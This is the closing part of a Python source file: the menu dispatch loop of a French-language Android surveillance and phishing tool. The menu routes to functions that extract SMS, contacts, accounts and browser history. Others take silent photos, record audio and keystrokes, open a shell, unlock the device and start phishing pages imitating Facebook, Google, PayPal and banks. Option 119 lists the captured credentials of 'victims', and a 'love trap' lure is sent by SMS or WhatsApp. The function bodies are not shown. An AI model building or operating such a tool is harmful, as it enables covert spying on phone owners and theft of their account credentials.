            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            if choice == "1":
                get_system_info()
            elif choice == "2":
                extract_sms()
            elif choice == "3":
                extract_contacts()
            elif choice == "4":
                extract_call_history()
            elif choice == "5":
                get_notifications()
            elif choice == "6":
                get_location()
            elif choice == "7":
                get_wifi_networks()
            elif choice == "8":
                list_apps()
            elif choice == "9":
                get_accounts()
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # SURVEILLANCE [10-19]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "10":
                take_screenshot_to_pc()
            elif choice == "11":
                duration = input("DurÃ©e en secondes (dÃ©faut 30): ").strip()
                record_video_screen(int(duration) if duration else 30)
            elif choice == "12":
                live_screen()
            elif choice == "13":
                duration = input("DurÃ©e en secondes (dÃ©faut 30): ").strip()
                record_audio(int(duration) if duration else 30)
            elif choice == "14":
                camera = input("CamÃ©ra (back/front, dÃ©faut back): ").strip()
                take_photo(camera if camera else "back")
            elif choice == "15":
                capture_input_events()
            elif choice == "16":
                take_photo_silent()
            elif choice == "17":
                count = input("Nombre de captures (dÃ©faut 5): ").strip()
                interval = input("Intervalle en secondes (dÃ©faut 2): ").strip()
                continuous_screenshots(int(count) if count else 5, int(interval) if interval else 2)
            elif choice == "18":
                watch_screen_continuous()
            elif choice == "19":
                duration = input("DurÃ©e surveillance (dÃ©faut 60s): ").strip()
                monitor_sms_live(int(duration) if duration else 60)
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # TÃ‰LÃ‰CHARGEMENT [20-29]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "20":
                download_photos()
            elif choice == "21":
                download_whatsapp()
            elif choice == "22":
                download_documents()
            elif choice == "23":
                full_backup()
            elif choice == "24":
                extract_all_media()
            elif choice == "25":
                get_installed_apps_detailed()
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # CONTRÃ”LE Ã€ DISTANCE [30-39]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "30":
                title = input("Titre: ").strip()
                message = input("Message: ").strip()
                send_notification(title, message)
            elif choice == "31":
                url = input("URL: ").strip()
                open_url(url)
            elif choice == "32":
                package = input("Package (ex: com.whatsapp): ").strip()
                open_app(package)
            elif choice == "33":
                text = input("Texte Ã  envoyer: ").strip()
                send_text(text)
            elif choice == "34":
                number = input("NumÃ©ro: ").strip()
                take_call(number)
            elif choice == "35":
                number = input("NumÃ©ro: ").strip()
                message = input("Message SMS: ").strip()
                send_sms_real(number, message)
            elif choice == "36":
                vibrate()
            elif choice == "37":
                interactive_shell()
            elif choice == "38":
                get_clipboard_content()
            elif choice == "39":
                text = input("Texte pour presse-papiers: ").strip()
                set_clipboard(text)
            
            # OPTIONS 100+ - CONTRÃ”LE AVANCÃ‰
            elif choice == "100":
                number = input("NumÃ©ro: ").strip()
                make_call_and_speaker(number)
            elif choice == "101":
                end_call()
            elif choice == "102":
                answer_call()
            elif choice == "103":
                reject_call()
            elif choice == "104":
                flash_screen()
            elif choice == "105":
                play_sound_alarm()
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # SÃ‰CURITÃ‰ / ANALYSE [40-49]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "40":
                detect_sensitive_apps()
            elif choice == "41":
                package = input("Package (vide = toutes): ").strip()
                get_app_permissions(package if package else None)
            elif choice == "42":
                get_running_processes()
            elif choice == "43":
                apk_path = input("Chemin de l'APK: ").strip()
                install_apk(apk_path)
            elif choice == "44":
                package = input("Package Ã  dÃ©sinstaller: ").strip()
                confirm = input(f"Confirmer dÃ©sinstallation de {package}? (oui/non): ")
                if confirm.lower() == "oui":
                    uninstall_app(package)
            elif choice == "45":
                package = input("Package Ã  arrÃªter: ").strip()
                force_stop_app(package)
            elif choice == "46":
                package = input("Package Ã  effacer: ").strip()
                clear_app_data(package)
            elif choice == "47":
                package = input("Package Ã  dÃ©sactiver: ").strip()
                disable_app(package)
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # CONTRÃ”LE Ã‰CRAN [50-59]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "50":
                screen_off()
            elif choice == "51":
                screen_on()
            elif choice == "52":
                pin = input("PIN (vide si aucun): ").strip()
                unlock_screen(pin)
            elif choice == "53":
                lock_screen()
            elif choice == "54":
                level = input("LuminositÃ© (0-255): ").strip()
                set_brightness(int(level) if level else 128)
            elif choice == "55":
                print("0=Portrait, 1=Paysage, 2=Portrait inversÃ©, 3=Paysage inversÃ©")
                orient = input("Orientation: ").strip()
                rotate_screen(int(orient) if orient else 0)
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # MÃ‰DIA / VOLUME [60-69]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "60":
                media_play_pause()
            elif choice == "61":
                media_next()
            elif choice == "62":
                media_previous()
            elif choice == "63":
                volume_up()
            elif choice == "64":
                volume_down()
            elif choice == "65":
                volume_mute()
            elif choice == "66":
                level = input("Volume mÃ©dia (0-15): ").strip()
                set_media_volume(int(level) if level else 7)
            elif choice == "67":
                level = input("Volume sonnerie (0-7): ").strip()
                set_ringtone_volume(int(level) if level else 5)
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # SIMULATION TOUCHES [70-79]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "70":
                x = input("Position X: ").strip()
                y = input("Position Y: ").strip()
                tap_screen(int(x), int(y))
            elif choice == "71":
                x1 = input("X dÃ©part: ").strip()
                y1 = input("Y dÃ©part: ").strip()
                x2 = input("X arrivÃ©e: ").strip()
                y2 = input("Y arrivÃ©e: ").strip()
                swipe_screen(int(x1), int(y1), int(x2), int(y2))
            elif choice == "72":
                x = input("Position X: ").strip()
                y = input("Position Y: ").strip()
                duration = input("DurÃ©e ms (dÃ©faut 1000): ").strip()
                long_press(int(x), int(y), int(duration) if duration else 1000)
            elif choice == "73":
                press_home()
            elif choice == "74":
                press_back()
            elif choice == "75":
                press_recent()
            elif choice == "76":
                open_quick_settings()
            elif choice == "77":
                open_notifications_panel()
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # CONNECTIVITÃ‰ [80-89]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "80":
                state = input("WiFi (1=ON, 0=OFF): ").strip()
                toggle_wifi(state == "1")
            elif choice == "81":
                state = input("DonnÃ©es mobiles (1=ON, 0=OFF): ").strip()
                toggle_mobile_data(state == "1")
            elif choice == "82":
                state = input("Bluetooth (1=ON, 0=OFF): ").strip()
                toggle_bluetooth(state == "1")
            elif choice == "83":
                state = input("Mode avion (1=ON, 0=OFF): ").strip()
                toggle_airplane_mode(state == "1")
            elif choice == "84":
                state = input("Localisation (1=ON, 0=OFF): ").strip()
                toggle_location(state == "1")
            elif choice == "85":
                get_current_wifi()
                get_ip_address()
            elif choice == "88":
                duration = input("DurÃ©e capture logs (dÃ©faut 10s): ").strip()
                monitor_logcat(int(duration) if duration else 10)
            elif choice == "89":
                print("Modes: normal, recovery, bootloader")
                mode = input("Mode de redÃ©marrage: ").strip()
                reboot_device(mode if mode else "normal")
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # GESTIONNAIRE FICHIERS [90-95]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "90":
                path = input("Chemin (dÃ©faut /sdcard): ").strip()
                list_files(path if path else "/sdcard")
            elif choice == "91":
                pattern = input("Motif de recherche: ").strip()
                path = input("Dossier (dÃ©faut /sdcard): ").strip()
                search_files(pattern, path if path else "/sdcard")
            elif choice == "92":
                remote = input("Chemin fichier distant: ").strip()
                download_file(remote)
            elif choice == "93":
                local = input("Chemin fichier local: ").strip()
                remote = input("Destination (dÃ©faut /sdcard/): ").strip()
                upload_file(local, remote if remote else "/sdcard/")
            elif choice == "94":
                path = input("Fichier Ã  supprimer: ").strip()
                confirm = input(f"Confirmer suppression de {path}? (oui/non): ")
                if confirm.lower() == "oui":
                    delete_file(path)
            elif choice == "95":
                path = input("Chemin du dossier Ã  crÃ©er: ").strip()
                create_folder(path)
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # EXTRACTION AVANCÃ‰E [96-99]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "96":
                package = input("Package de l'app: ").strip()
                extract_app_data(package)
            elif choice == "97":
                extract_calendar()
            elif choice == "98":
                extract_browser_history()
            elif choice == "99":
                full_extraction()
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PHISHING - VOL D'IDENTIFIANTS [110-125]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "110":
                phishing_menu()
            elif choice == "111":
                start_phishing_server("facebook")
            elif choice == "112":
                start_phishing_server("google")
            elif choice == "113":
                start_phishing_server("instagram")
            elif choice == "114":
                start_phishing_server("whatsapp")
            elif choice == "115":
                start_phishing_server("netflix")
            elif choice == "116":
                start_phishing_server("paypal")
            elif choice == "117":
                start_phishing_server("bank")
            elif choice == "118":
                send_phishing_link()
            elif choice == "119":
                # Afficher les captures
                if CAPTURED_DATA:
                    print(f"\n{C.GREEN}{'â•'*70}{C.END}")
                    print(f"{C.BOLD}{C.GREEN}ğŸ“Š IDENTIFIANTS CAPTURÃ‰S ({len(CAPTURED_DATA)} victimes){C.END}")
                    print(f"{C.GREEN}{'â•'*70}{C.END}")
                    for i, cap in enumerate(CAPTURED_DATA, 1):
                        print(f"\n    {C.YELLOW}[Victime {i}]{C.END} {cap['timestamp']}")
                        print(f"    {C.CYAN}IP:{C.END} {cap['ip']} | {C.CYAN}Site:{C.END} {cap.get('template', 'N/A')}")
                        print(f"    {C.RED}ğŸ” Identifiants:{C.END}")
                        for k, v in cap['data'].items():
                            print(f"        {k}: {v}")
                    print(f"\n{C.GREEN}{'â•'*70}{C.END}")
                else:
                    print_info("Aucune donnÃ©e capturÃ©e pour le moment")
            elif choice == "120":
                start_phishing_server("tiktok")
            elif choice == "121":
                start_phishing_server("snapchat")
            elif choice == "122":
                start_phishing_server("outlook")
            elif choice == "123":
                start_phishing_server("amazon")
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # PIÃˆGE AMOUR [130-135]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "130":
                start_love_trap()
                input(f"\n    {C.YELLOW}Appuie sur EntrÃ©e pour arrÃªter le serveur...{C.END}")
                if LOVE_TRAP_SERVER:
                    LOVE_TRAP_SERVER.shutdown()
            elif choice == "131":
                send_love_trap_sms()
            elif choice == "132":
                send_love_trap_whatsapp()
            
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            # QUITTER [0]
            # â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
            elif choice == "0":
                print(f"\n{C.YELLOW}ğŸ‘‹ Au revoir!{C.END}\n")
                break
            
            else:
                print_error("Option invalide")
        
        except Exception as e:
            print_error(f"Erreur: {e}")
        
        input(f"\n    {C.CYAN}â Appuyez sur EntrÃ©e pour continuer...{C.END}")

if __name__ == "__main__":
    main()
